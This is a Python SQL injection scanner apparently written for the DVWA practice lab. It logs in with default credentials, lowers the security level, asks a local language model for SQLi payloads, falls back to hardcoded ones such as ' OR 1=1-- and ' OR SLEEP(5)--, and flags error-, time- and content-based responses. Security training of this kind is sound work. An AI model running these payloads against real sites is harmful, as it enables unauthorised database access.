import os
import sys
import requests
import json
import time
from bs4 import BeautifulSoup
from openai import OpenAI
import dotenv

dotenv.load_dotenv()

OLLAMA_BASE_URL = os.getenv("OLLAMA_BASE_URL", "http://localhost:11434/v1")
OLLAMA_MODEL = os.getenv("OLLAMA_MODEL", "llama3.2")

client = OpenAI(base_url=OLLAMA_BASE_URL, api_key="ollama")

print(f"[*] Using Ollama model: {OLLAMA_MODEL} AT {OLLAMA_BASE_URL}")



def generate_llm_payloads(form_data):

    prompt = f"""
You are an expert penetration tester.

Generate 5 SQL injection payloads.

Requirements:
- Error based
- Union based
- Boolean based
- Time based

Return ONLY JSON array.

Example:
["' OR 1=1--", "' UNION SELECT NULL--"]
"""

    try:

        response = client.chat.completions.create(
            model=OLLAMA_MODEL,
            messages=[{"role": "user", "content": prompt}]
        )

        text = response.choices[0].message.content.strip()

        if text.startswith("```"):
            text = text.replace("```json", "").replace("```", "")

        payloads = json.loads(text)

        if isinstance(payloads, list):
            return payloads

    except Exception as e:

        print("[-] LLM failed:", e)

    print("[*] Using fallback payloads")

    return [
        "'",
        "' OR 1=1--",
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "' OR SLEEP(5)--"
    ]



def login_dvwa(login_url):

    session = requests.Session()

    try:

        r = session.get(login_url)

        soup = BeautifulSoup(r.text, "html.parser")

        token = soup.find("input", {"name": "user_token"})

        login_data = {
            "username": "admin",
            "password": "password",
            "Login": "Login"
        }

        if token:
            login_data["user_token"] = token["value"]

        session.post(login_url, data=login_data)

        session.cookies.set("security", "low")

        print("[+] Login Successful")
        print("[+] Security level set to LOW")

        return session

    except Exception as e:

        print("Login error:", e)

        return None



def is_sql_error(text):

    errors = [
        "sql syntax",
        "mysql_fetch",
        "mysqli_fetch",
        "warning mysql",
        "unclosed quotation",
        "quoted string not properly terminated"
    ]

    text = text.lower()

    for err in errors:
        if err in text:
            return True

    return False



def test_form(page_url, form, session, payloads):

    vulnerabilities = []

    method = form.get("method", "get").lower()

    inputs = form.get("inputs", [])

    buttons = []

    real_inputs = []

    for inp in inputs:

        if inp.get("type") == "submit":
            buttons.append(inp)
        else:
            real_inputs.append(inp)

    action = page_url

    baseline_data = {}

    for inp in real_inputs:
        if inp.get("name"):
            baseline_data[inp["name"]] = "1"

    for btn in buttons:
        if btn.get("name"):
            baseline_data[btn["name"]] = btn.get("value", "")

    if method == "post":
        baseline = session.post(action, data=baseline_data)
    else:
        baseline = session.get(action, params=baseline_data)

    baseline_length = len(baseline.text)

    for payload in payloads:

        for field in real_inputs:

            name = field.get("name")

            if not name:
                continue

            data = {}

            for inp in real_inputs:

                inp_name = inp.get("name")

                if not inp_name:
                    continue

                if inp_name == name:
                    data[inp_name] = payload
                else:
                    data[inp_name] = "1"

            for btn in buttons:
                if btn.get("name"):
                    data[btn["name"]] = btn.get("value", "")

            try:

                start = time.time()

                if method == "post":
                    response = session.post(action, data=data)
                else:
                    response = session.get(action, params=data)

                end = time.time()

                print("\nTesting:", response.url)
                print("Payload:", payload)

                if is_sql_error(response.text):

                    print("[!] SQL Error detected")

                    vulnerabilities.append({
                        "page": page_url,
                        "payload": payload,
                        "type": "Error-based SQLi"
                    })

                if end - start > 4:

                    print("[!] Time-based SQLi detected")

                    vulnerabilities.append({
                        "page": page_url,
                        "payload": payload,
                        "type": "Time-based SQLi"
                    })

                if abs(len(response.text) - baseline_length) > 100:

                    print("[!] Possible SQL Injection (content difference)")

                    vulnerabilities.append({
                        "page": page_url,
                        "payload": payload,
                        "type": "Content-based SQLi"
                    })

            except requests.RequestException as e:

                print("Request error:", e)

    return vulnerabilities


def main():

    if len(sys.argv) < 3:

        print("Usage:")
        print("python main.py <base_url> <login_url>")
        sys.exit(1)

    base_url = sys.argv[1]
    login_url = sys.argv[2]

    session = login_dvwa(login_url)

    if not session:
        sys.exit(1)

    try:

        with open("pages.json", "r") as f:
            forms_data = json.load(f)

    except:

        print("pages.json missing")
        sys.exit(1)

    all_vulns = []

    print("\n[+] Starting SQL Injection Scan\n")

    for form in forms_data:

        page_url = form.get("page")

        if not page_url:
            continue

        if "vulnerabilities" not in page_url:
            continue

        print("\nScanning:", page_url)

        payloads = generate_llm_payloads(form)

        print(f"[+] Using {len(payloads)} payloads")

        vulns = test_form(page_url, form, session, payloads)

        all_vulns.extend(vulns)

    with open("vulnerabilities.json", "w") as f:
        json.dump(all_vulns, f, indent=4)

    print("\n[+] Scan complete")
    print("[+] Vulnerabilities found:", len(all_vulns))


if __name__ == "__main__":
    main()